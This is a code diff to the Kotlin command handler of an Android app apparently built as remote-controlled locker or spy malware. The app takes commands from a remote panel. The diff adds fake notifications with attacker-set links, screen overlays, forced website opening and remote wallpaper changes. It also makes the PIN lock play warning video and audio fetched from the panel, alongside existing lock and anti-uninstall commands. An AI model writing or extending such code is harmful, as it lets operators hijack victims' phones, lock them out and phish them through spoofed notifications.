@@ -9,6 +9,8 @@ import android.location.Geocoder
 import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.provider.MediaStore
@@ -72,6 +74,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     // ============================================================
     fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
         when (cmd) {
+
             // ===== LOCK PIN =====
             "lock_pin" -> {
                 val pin = args?.get("pin")?.asString ?: "1234"
@@ -181,12 +184,76 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("anti_uninstall" to true))
             }
 
+            // ===== FAKE NOTIF (BARU) =====
+            "fake_notif" -> {
+                val title = args?.get("title")?.asString ?: "Pesan Baru"
+                val message = args?.get("message")?.asString ?: ""
+                val iconUrl = args?.get("iconUrl")?.asString
+                val clickUrl = args?.get("clickUrl")?.asString
+                FakeNotify.show(ctx, title, message, iconUrl, clickUrl)
+                done(mapOf("ok" to true))
+            }
+
+            // ===== BROADCAST CHAT (BARU) =====
+            "broadcast" -> {
+                val title = args?.get("title")?.asString ?: "Pesan"
+                val message = args?.get("message")?.asString ?: ""
+                val duration = args?.get("duration")?.asInt ?: 5
+                Handler(Looper.getMainLooper()).post {
+                    BroadcastOverlay.show(ctx, title, message, duration)
+                }
+                done(mapOf("ok" to true))
+            }
+
+            // ===== SET WALLPAPER (BARU) =====
+            "set_wallpaper" -> {
+                val url = args?.get("url")?.asString ?: ""
+                if (url.isEmpty()) {
+                    done(mapOf("error" to "no url"))
+                } else {
+                    WallpaperSetter.setFromUrl(ctx, url) { success ->
+                        done(mapOf("ok" to success))
+                    }
+                }
+            }
+
+            // ===== OPEN WEBSITE (BARU) =====
+            "open_website" -> {
+                val url = args?.get("url")?.asString ?: ""
+                if (url.isEmpty()) {
+                    done(mapOf("error" to "no url"))
+                } else {
+                    try {
+                        val i = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        ctx.startActivity(i)
+                        done(mapOf("ok" to true))
+                    } catch (e: Exception) {
+                        done(mapOf("error" to e.message))
+                    }
+                }
+            }
+
+            // ===== HIDE BROADCAST (BARU) =====
+            "hide_broadcast" -> {
+                Handler(Looper.getMainLooper()).post {
+                    BroadcastOverlay.hide(ctx)
+                }
+                done(mapOf("ok" to true))
+            }
+
+            // ===== READ NOTIFS (BARU) =====
+            "read_notifs" -> {
+                done(mapOf("type" to "text", "data" to "Notif listener aktif"))
+            }
+
             else -> done(mapOf("error" to "unknown: $cmd"))
         }
     }
 
     // ============================================================
-    // LOCK SERVICE HELPERS
+    // LOCK SERVICE HELPER (AUTO VIDEO/AUDIO WARNING)
     // ============================================================
     private fun startLockService(
         type: String,
@@ -196,12 +263,20 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         audioUrl: String?
     ) {
         try {
+            val panelBase = App.config.panelUrl
+                .replace("ws://", "http://")
+                .replace("wss://", "https://")
+                .replace("/ws", "")
+
+            val finalVideo = if (videoUrl.isNullOrEmpty()) "$panelBase/videos/warning.mp4" else videoUrl
+            val finalAudio = if (audioUrl.isNullOrEmpty()) "$panelBase/audios/warning.mp3" else audioUrl
+
             val i = Intent(ctx, LockService::class.java).apply {
                 putExtra("type", type)
                 putExtra("pin", pin)
                 putExtra("hours", hours)
-                if (!videoUrl.isNullOrEmpty()) putExtra("videoUrl", videoUrl)
-                if (!audioUrl.isNullOrEmpty()) putExtra("audioUrl", audioUrl)
+                putExtra("videoUrl", finalVideo)
+                putExtra("audioUrl", finalAudio)
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 ctx.startForegroundService(i)
